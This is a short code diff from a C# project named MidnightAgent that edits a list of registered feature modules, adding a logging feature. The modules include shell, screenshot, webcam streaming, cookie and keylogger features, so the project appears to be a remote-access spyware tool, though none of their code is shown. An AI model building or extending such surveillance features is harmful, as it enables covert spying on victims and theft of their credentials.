@@ -16,9 +16,9 @@ namespace MidnightAgent.Features
                 new MenuFeature(),
                 new NickFeature(), // 🏷️ Nickname Support
 
-                // System & Info
                 new SystemInfoFeature(),
                 new LocationFeature(),
+                new LogFeature(),
                 
                 // Shell & Commands
                 new ShellFeature(),
@@ -30,6 +30,7 @@ namespace MidnightAgent.Features
                 new ScreenshotFeature(),
                 new WebcamFeature(),
                 new StreamCamFeature(),
+
                 new CookieFeature(),
                 new KeyloggerFeature(),
                 new SearchFeature(),
